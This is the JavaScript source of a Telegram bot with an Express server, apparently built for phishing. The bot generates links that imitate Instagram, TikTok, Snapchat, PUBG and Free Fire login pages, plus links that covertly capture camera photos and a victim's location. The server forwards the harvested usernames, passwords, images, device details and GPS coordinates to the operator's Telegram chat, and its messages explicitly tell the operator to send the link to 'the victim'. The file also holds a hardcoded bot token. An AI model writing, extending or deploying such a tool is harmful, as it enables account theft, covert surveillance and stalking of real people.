const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const botToken = '8380316975:AAEjcllXjRKFlJkCL9XoD-pe9yVOx-NKQZQ';
const bot = new TelegramBot(botToken, { polling: true });
const app = express();

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let shortLinkStore = {};

function generateShortToken(chatId, type) {
    const token = crypto.randomBytes(4).toString('hex');
    shortLinkStore[token] = { chatId, type, timestamp: Date.now() };
    return token;
}

// --- البوت وقوائم الأزرار ---
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const buttons = [
        [{ text: '📸 كاميرا أمامية', callback_data: `c:${chatId}` }, { text: '📷 كاميرا خلفية', callback_data: `b:${chatId}` }],
        [{ text: '🖥️ انستجرام', callback_data: `i:${chatId}` }, { text: '📳 تيك توك', callback_data: `t:${chatId}` }],
        [{ text: '🕹️ ببجي', callback_data: `g:${chatId}` }, { text: '👾 فري فاير', callback_data: `F:${chatId}` }],
        [{ text: '⭐ سناب شات', callback_data: `s:${chatId}` }, { text: '📍 موقع الضحية', callback_data: `l:${chatId}` }]
    ];
    bot.sendMessage(chatId, 'مرحباً بك في بوت الاختراق المطور 🚀\nاختر الأداة التي تريد استخدامها:', {
        reply_markup: { inline_keyboard: buttons }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const [type, id] = query.data.split(':');
    const token = generateShortToken(id, type);
    const baseUrl = "https://botwahm.onrender.com"; // قم بتغيير هذا لرابط السيرفر الخاص بك
    
    let link = "";
    if (type === 'i') link = `${baseUrl}/i.html?t=${token}`;
    else if (type === 't') link = `${baseUrl}/t.html?t=${token}`;
    else if (type === 'g') link = `${baseUrl}/g.html?t=${token}`;
    else if (type === 'F') link = `${baseUrl}/F.html?t=${token}`;
    else if (type === 's') link = `${baseUrl}/s.html?t=${token}`;
    else if (type === 'c') link = `${baseUrl}/c.html?t=${token}`;
    else if (type === 'l') link = `${baseUrl}/lo.html?t=${token}`;
    else link = `${baseUrl}/${type}.html?t=${token}`;

    bot.sendMessage(chatId, `✅ تم إنشاء الرابط بنجاح:\n\n🔗 الرابط: ${link}\n\nأرسل الرابط للضحية وانتظر وصول البيانات هنا.`);
});

// --- مسارات الويب ---
app.post('/submitNames', (req, res) => {
    const { token, firstName, secondName } = req.body;
    if (token && shortLinkStore[token]) {
        const chatId = shortLinkStore[token].chatId;
        bot.sendMessage(chatId, `👤 **بيانات جديدة:**\n\nالاسم/اليوزر: \`${firstName}\`\nكلمة السر: \`${secondName}\``, { parse_mode: 'Markdown' });
        res.sendFile(path.join(__dirname, 'ok.html'));
    } else { res.status(400).send('Error'); }
});

app.post('/submitPhotos', (req, res) => {
    const { token, imageData } = req.body;
    if (token && shortLinkStore[token]) {
        const chatId = shortLinkStore[token].chatId;
        const buffer = Buffer.from(imageData, 'base64');
        bot.sendPhoto(chatId, buffer, { caption: '📸 تم التقاط صورة من الضحية' });
        res.json({ success: true });
    } else { res.status(400).send('Error'); }
});

app.post('/mm', (req, res) => {
    const { token, deviceInfo } = req.body;
    if (token && shortLinkStore[token]) {
        const chatId = shortLinkStore[token].chatId;
        let msg = `📱 **معلومات الجهاز:**\n`;
        if (deviceInfo.lat) msg += `📍 **الموقع:** https://www.google.com/maps?q=${deviceInfo.lat},${deviceInfo.lon}\n`;
        for (let k in deviceInfo) if(k!='lat'&&k!='lon') msg += `- ${k}: ${deviceInfo[k]}\n`;
        bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } else { res.status(400).send('Error'); }
});

app.get('/ok.html', (req, res) => res.sendFile(path.join(__dirname, 'ok.html')));
app.get('/:page', (req, res) => {
    const page = req.params.page;
    if (fs.existsSync(path.join(__dirname, page))) res.sendFile(path.join(__dirname, page));
    else res.status(404).send('Not Found');
});

app.listen(process.env.PORT || 3000, () => console.log('Server is running...'));
